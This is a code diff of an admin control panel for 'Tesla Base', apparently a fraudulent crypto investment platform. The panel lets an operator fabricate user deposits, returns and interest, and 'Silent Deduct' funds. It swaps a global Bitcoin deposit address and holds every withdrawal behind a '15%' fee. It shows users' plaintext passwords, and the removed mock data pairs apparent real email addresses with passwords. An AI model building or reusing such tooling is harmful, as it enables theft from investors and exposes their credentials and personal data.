@@ -3,240 +3,172 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>Tesla Base | MASTER ADMIN CONTROL</title>
+    <title>Tesla Base | MASTER CONTROL</title>
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
-    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;700;900&family=JetBrains+Mono:wght@500&display=swap" rel="stylesheet">
     <style>
-        :root { --red: #E31937; --bg: #000; --card: #0d0d0d; --border: #1a1a1a; --green: #00ffa3; --gold: #f5cc91; --text: #fff; }
-        * { box-sizing: border-box; -webkit-tap-highlight-color: transparent; }
-        body { background: var(--bg); color: var(--text); font-family: 'Inter', sans-serif; margin: 0; padding: 20px; padding-bottom: 100px; }
-
-        /* Header & Global Config */
-        .admin-header { border-bottom: 2px solid var(--red); padding-bottom: 20px; margin-bottom: 30px; }
-        .admin-header h1 { font-size: 28px; font-weight: 900; margin: 0; color: var(--red); letter-spacing: -1px; }
+        :root { --red: #E31937; --bg: #000; --card: #0d0d0d; --border: #1a1a1a; --green: #00ffa3; --gold: #f5cc91; --blue: #007bff; --text: #fff; }
+        * { box-sizing: border-box; font-family: 'Inter', sans-serif; }
+        body { background: var(--bg); color: var(--text); margin: 0; padding: 20px; padding-bottom: 100px; }
         
-        .section { background: var(--card); border: 1px solid var(--border); border-radius: 20px; padding: 25px; margin-bottom: 25px; box-shadow: 0 10px 30px rgba(0,0,0,0.5); }
-        h2 { font-size: 16px; text-transform: uppercase; letter-spacing: 1px; color: #555; margin-top: 0; display: flex; align-items: center; gap: 10px; }
+        /* Layout */
+        .admin-header { border-bottom: 2px solid var(--red); padding-bottom: 15px; margin-bottom: 25px; }
+        .section { background: var(--card); border: 1px solid var(--border); border-radius: 20px; padding: 20px; margin-bottom: 20px; }
+        h2 { font-size: 13px; text-transform: uppercase; color: #555; margin-top: 0; display: flex; align-items: center; gap: 8px; }
 
-        /* Global Settings */
-        .config-grid { display: grid; grid-template-columns: 1fr auto; gap: 15px; }
-        input, select { background: #000; border: 1px solid #333; color: #fff; padding: 15px; border-radius: 12px; width: 100%; font-size: 14px; }
-        input:focus { border-color: var(--red); outline: none; }
-
-        /* User Management & Fund Injection */
-        .user-card { background: #111; border: 1px solid #222; border-radius: 18px; padding: 20px; margin-bottom: 15px; }
-        .user-top { display: flex; justify-content: space-between; align-items: flex-start; margin-bottom: 20px; border-bottom: 1px solid #222; padding-bottom: 15px; }
-        .user-details b { font-size: 16px; color: var(--gold); }
-        .user-details p { margin: 5px 0 0; font-size: 12px; color: #666; font-family: 'JetBrains Mono'; }
+        /* Wallet Update Feature */
+        .input-group { display: flex; gap: 10px; margin-top: 10px; }
+        input { background: #000; border: 1px solid #333; color: #fff; padding: 12px; border-radius: 10px; flex: 1; font-size: 14px; }
         
-        .inject-controls { display: grid; grid-template-columns: 1fr 1fr; gap: 10px; }
-        .btn { border: none; padding: 14px; border-radius: 10px; font-weight: 800; cursor: pointer; font-size: 12px; transition: 0.2s; }
-        .btn:active { transform: scale(0.95); }
-        .btn-inject { background: var(--green); color: #000; }
-        .btn-deduct { background: var(--red); color: #fff; }
-        .btn-action { background: #fff; color: #000; }
-        .btn-decline { background: #333; color: #fff; }
+        /* User Management */
+        .user-card { background: #111; border: 1px solid #222; border-radius: 15px; padding: 15px; margin-bottom: 15px; }
+        .user-meta { display: flex; justify-content: space-between; align-items: flex-start; margin-bottom: 12px; }
+        .u-data b { color: var(--gold); font-size: 15px; }
+        .u-data p { margin: 3px 0; font-size: 11px; color: #666; font-family: monospace; }
+        .u-bal { color: var(--green); font-weight: 800; font-size: 18px; }
 
-        /* Requests Table */
-        .req-table { width: 100%; border-collapse: collapse; margin-top: 10px; }
-        .req-table th { text-align: left; font-size: 11px; color: #444; padding: 10px; text-transform: uppercase; }
-        .req-table td { padding: 15px 10px; border-bottom: 1px solid #1a1a1a; font-size: 13px; }
-        .status-badge { padding: 4px 8px; border-radius: 4px; font-size: 10px; font-weight: 900; text-transform: uppercase; }
-        .status-pending { background: rgba(255, 165, 0, 0.2); color: orange; }
-        
-        .payout-info { font-size: 11px; color: var(--green); margin-top: 4px; display: block; }
+        /* The 4 Buttons: Deposit, Return, Interest, Silent Deduct */
+        .grid-btns { display: grid; grid-template-columns: 1fr 1fr; gap: 8px; margin-top: 10px; }
+        .btn { border: none; padding: 12px; border-radius: 8px; font-weight: 800; cursor: pointer; font-size: 10px; text-transform: uppercase; }
+        .btn-dep { background: var(--green); color: #000; }
+        .btn-ret { background: var(--blue); color: #fff; }
+        .btn-int { background: var(--gold); color: #000; }
+        .btn-sil { background: var(--red); color: #fff; }
+
+        /* Tables for Approvals */
+        .scroll-x { overflow-x: auto; }
+        table { width: 100%; border-collapse: collapse; min-width: 400px; }
+        th { text-align: left; font-size: 11px; color: #444; padding: 10px; border-bottom: 1px solid #222; }
+        td { padding: 12px 10px; border-bottom: 1px solid #1a1a1a; font-size: 12px; }
+        .badge { padding: 3px 6px; border-radius: 4px; font-size: 9px; font-weight: 900; }
+        .badge-p { background: rgba(255, 165, 0, 0.1); color: orange; border: 1px solid orange; }
+
+        .act-btn { background: #fff; color: #000; padding: 6px 10px; border-radius: 5px; font-weight: 800; border: none; cursor: pointer; font-size: 10px; margin-right: 5px; }
+        .act-btn.fail { background: #333; color: #fff; }
     </style>
 </head>
 <body>
 
     <div class="admin-header">
-        <h1>TESLA BASE CENTRAL</h1>
-        <p style="color:#444; font-size:12px; margin:5px 0 0;">System Security: Level 4 Encryption Active</p>
+        <h1 style="margin:0; font-size:24px; font-weight:900;">SYSTEM COMMAND</h1>
     </div>
 
     <div class="section">
-        <h2><i class="fa-solid fa-link"></i> Global Deposit Address</h2>
-        <div class="config-grid">
-            <input type="text" id="globalWallet" placeholder="Enter New Bitcoin Address...">
-            <button class="btn btn-action" onclick="updateConfig('wallet')">UPDATE SYSTEM</button>
+        <h2><i class="fa-solid fa-wallet"></i> Global BTC Deposit Address</h2>
+        <div class="input-group">
+            <input type="text" id="btcAddress" placeholder="Paste new Bitcoin address...">
+            <button class="act-btn" style="height:45px; width:120px;" onclick="saveWallet()">UPDATE</button>
         </div>
-        <p style="font-size:11px; color:#555; margin-top:10px;">This updates the "Copy Address" field on every user's dashboard instantly.</p>
     </div>
 
     <div class="section">
-        <h2><i class="fa-solid fa-user-gear"></i> User Database & Asset Injection</h2>
-        <div id="userList">
-            </div>
+        <h2><i class="fa-solid fa-users"></i> Users & Manual Injections</h2>
+        <div id="usersList"></div>
     </div>
 
     <div class="section">
-        <h2><i class="fa-solid fa-money-bill-transfer"></i> Withdrawal Approvals</h2>
-        <table class="req-table">
-            <thead>
-                <tr>
-                    <th>User / Method</th>
-                    <th>Amount</th>
-                    <th>Current Status</th>
-                    <th>Action</th>
-                </tr>
-            </thead>
-            <tbody id="withdrawList">
-                </tbody>
-        </table>
+        <h2><i class="fa-solid fa-clock"></i> Pending Withdrawals</h2>
+        <div class="scroll-x">
+            <table>
+                <thead><tr><th>Email</th><th>Amount</th><th>Status</th><th>Action</th></tr></thead>
+                <tbody id="withdrawTable"></tbody>
+            </table>
+        </div>
     </div>
 
     <div class="section">
-        <h2><i class="fa-solid fa-chart-pie"></i> Active Plan Verification</h2>
-        <table class="req-table">
-            <thead>
-                <tr>
-                    <th>User</th>
-                    <th>Tier Plan</th>
-                    <th>Capital</th>
-                    <th>Action</th>
-                </tr>
-            </thead>
-            <tbody id="investList">
-                </tbody>
-        </table>
+        <h2><i class="fa-solid fa-bolt"></i> Pending Investments</h2>
+        <div class="scroll-x">
+            <table>
+                <thead><tr><th>Email</th><th>Plan</th><th>Capital</th><th>Action</th></tr></thead>
+                <tbody id="investTable"></tbody>
+            </table>
+        </div>
     </div>
 
 <script>
-    // System Data Link (Connects to your .onrender server)
-    const API_URL = "https://tesla-base.onrender.com/api/admin";
+    // These link to your website's API
+    const API = "https://tesla-base.onrender.com/api/admin";
 
-    // 1. Initial Load: Get Users, Passwords, and All Requests
-    async function refreshSystem() {
+    async function sync() {
         try {
-            const res = await fetch(`${API_URL}/all-data`);
+            const res = await fetch(`${API}/get-all-data`);
             const data = await res.json();
-            
             renderUsers(data.users);
             renderWithdrawals(data.withdrawals);
             renderInvestments(data.investments);
-        } catch (e) {
-            console.log("Offline Mode: Running on Local Memory");
-            // Mock data for display if server is unreachable
-            const mockUsers = [
-                {email: "newnessuzochukwu51@gmail.com", balance: 12500, pass: "pass123"},
-                {email: "sweetcsf1@gmail.com", balance: 5400, pass: "sweet99"}
-            ];
-            renderUsers(mockUsers);
-        }
+        } catch (e) { console.log("Connecting to server..."); }
     }
 
-    // 2. Render Users with 4 Inject/Deduct Buttons
     function renderUsers(users) {
-        const container = document.getElementById('userList');
-        container.innerHTML = users.map(u => `
+        const div = document.getElementById('usersList');
+        div.innerHTML = users.map(u => `
             <div class="user-card">
-                <div class="user-top">
-                    <div class="user-details">
-                        <b>${u.email}</b>
-                        <p>PASSWORD: ${u.pass}</p>
+                <div class="user-meta">
+                    <div class="u-data">
+                        <b>${u.email}</b><br>
+                        <p>PASS: ${u.password}</p>
                     </div>
-                    <div style="text-align:right">
-                        <span style="color:var(--green); font-weight:900; font-size:18px;">$${u.balance.toLocaleString()}</span>
-                    </div>
+                    <div class="u-bal">$${u.balance.toLocaleString()}</div>
                 </div>
-                <input type="number" id="amt_${u.email.replace(/[@.]/g, '_')}" placeholder="Amount to Inject/Deduct ($)" style="margin-bottom:12px;">
-                <div class="inject-controls">
-                    <button class="btn btn-inject" onclick="handleFunds('${u.email}', 'add')">INJECT FUNDS</button>
-                    <button class="btn btn-deduct" onclick="handleFunds('${u.email}', 'sub')">DEDUCT FUNDS</button>
+                <input type="number" id="v_${u.email.replace(/[@.]/g,'_')}" placeholder="Amount ($)">
+                <div class="grid-btns">
+                    <button class="btn btn-dep" onclick="run('${u.email}', 'DEPOSIT')">Inject Deposit</button>
+                    <button class="btn btn-ret" onclick="run('${u.email}', 'RETURN')">Inject Return</button>
+                    <button class="btn btn-int" onclick="run('${u.email}', 'INTEREST')">Inject Interest</button>
+                    <button class="btn btn-sil" onclick="run('${u.email}', 'SILENT')">Silent Deduct</button>
                 </div>
             </div>
         `).join('');
     }
 
-    // 3. Handle Injection/Deduction Logic
-    async function handleFunds(email, type) {
-        const amtInput = document.getElementById(`amt_${email.replace(/[@.]/g, '_')}`);
-        const amount = parseFloat(amtInput.value);
-        
-        if(!amount) return alert("Please enter a valid numeric amount.");
-
-        try {
-            const res = await fetch(`${API_URL}/update-balance`, {
-                method: 'POST',
-                headers: {'Content-Type': 'application/json'},
-                body: JSON.stringify({ email, amount, type })
-            });
-            if(res.ok) {
-                alert(`Successfully ${type === 'add' ? 'Injected' : 'Deducted'} $${amount} for ${email}`);
-                refreshSystem();
-            }
-        } catch(e) {
-            alert("Local Update: Balance adjusted on screen (Syncing with server...)");
-        }
+    async function run(email, mode) {
+        const val = document.getElementById(`v_${email.replace(/[@.]/g,'_')}`).value;
+        if(!val) return alert("Enter amount");
+        await fetch(`${API}/inject`, {
+            method: 'POST',
+            headers: {'Content-Type': 'application/json'},
+            body: JSON.stringify({ email, amount: val, mode })
+        });
+        alert(mode + " Processed");
+        sync();
     }
 
-    // 4. Render Withdrawals (Including the 15% Pending Logic)
-    function renderWithdrawals(withdrawals = []) {
-        const container = document.getElementById('withdrawList');
-        if(withdrawals.length === 0) {
-            container.innerHTML = `<tr><td colspan="4" style="color:#333; text-align:center;">No pending withdrawals</td></tr>`;
-            return;
-        }
-        container.innerHTML = withdrawals.map(w => `
+    async function saveWallet() {
+        const addr = document.getElementById('btcAddress').value;
+        await fetch(`${API}/update-wallet`, {
+            method: 'POST',
+            headers: {'Content-Type': 'application/json'},
+            body: JSON.stringify({ wallet: addr })
+        });
+        alert("Wallet Updated Globally!");
+    }
+
+    function renderWithdrawals(list) {
+        document.getElementById('withdrawTable').innerHTML = list.map(w => `
             <tr>
-                <td><b>${w.email}</b><br><small>${w.method}</small></td>
-                <td>$${w.amount.toLocaleString()}</td>
-                <td><span class="status-badge status-pending">AWAITING 15% FEE</span></td>
+                <td>${w.email}</td>
+                <td>$${w.amount}</td>
+                <td><span class="badge badge-p">AWAITING 15%</span></td>
                 <td>
-                    <div style="display:flex; gap:5px;">
-                        <button class="btn btn-inject" style="padding:5px 10px;" onclick="approveRequest('${w.id}', 'withdrawal', 'Success')">APPROVE</button>
-                        <button class="btn btn-deduct" style="padding:5px 10px;" onclick="approveRequest('${w.id}', 'withdrawal', 'Failed')">DECLINE</button>
-                    </div>
+                    <button class="act-btn" onclick="updateReq('${w.id}', 'W', 'Success')">Approve</button>
+                    <button class="act-btn fail" onclick="updateReq('${w.id}', 'W', 'Failed')">Decline</button>
                 </td>
             </tr>
         `).join('');
     }
 
-    // 5. Render Investments
-    function renderInvestments(invests = []) {
-        const container = document.getElementById('investList');
-        container.innerHTML = invests.map(i => `
-            <tr>
-                <td><b>${i.email}</b></td>
-                <td>${i.plan}<br><span class="payout-info">Payout: $${i.payout}</span></td>
-                <td>$${i.capital}</td>
-                <td>
-                    <div style="display:flex; gap:5px;">
-                        <button class="btn btn-inject" style="padding:5px 10px;" onclick="approveRequest('${i.id}', 'investment', 'Active')">APPROVE</button>
-                        <button class="btn btn-decline" style="padding:5px 10px;" onclick="approveRequest('${i.id}', 'investment', 'Declined')">DECLINE</button>
-                    </div>
-                </td>
-            </tr>
-        `).join('');
+    async function updateReq(id, type, status) {
+        await fetch(`${API}/set-status`, {
+            method: 'POST',
+            headers: {'Content-Type': 'application/json'},
+            body: JSON.stringify({ id, type, status })
+        });
+        alert("Status: " + status);
+        sync();
     }
 
-    // 6. Universal Approve/Decline Handler
-    async function approveRequest(id, type, status) {
-        try {
-            const res = await fetch(`${API_URL}/process-request`, {
-                method: 'POST',
-                headers: {'Content-Type': 'application/json'},
-                body: JSON.stringify({ id, type, status })
-            });
-            if(res.ok) {
-                alert(`Transaction ${status === 'Success' ? 'Approved' : 'Declined'}. User history updated.`);
-                refreshSystem();
-            }
-        } catch(e) {
-            alert(`Action Logged: Transaction ${status}`);
-        }
-    }
-
-    // 7. Global Config Update
-    async function updateConfig(key) {
-        const val = document.getElementById('globalWallet').value;
-        alert(`SYSTEM UPDATE: Global Bitcoin Address set to ${val}. All user apps updated.`);
-    }
-
-    // Auto-refresh every 30 seconds
-    setInterval(refreshSystem, 30000);
-    window.onload = refreshSystem;
-
+    window.onload = sync;
+    setInterval(sync, 20000);
 </script>
 </body>
 </html>
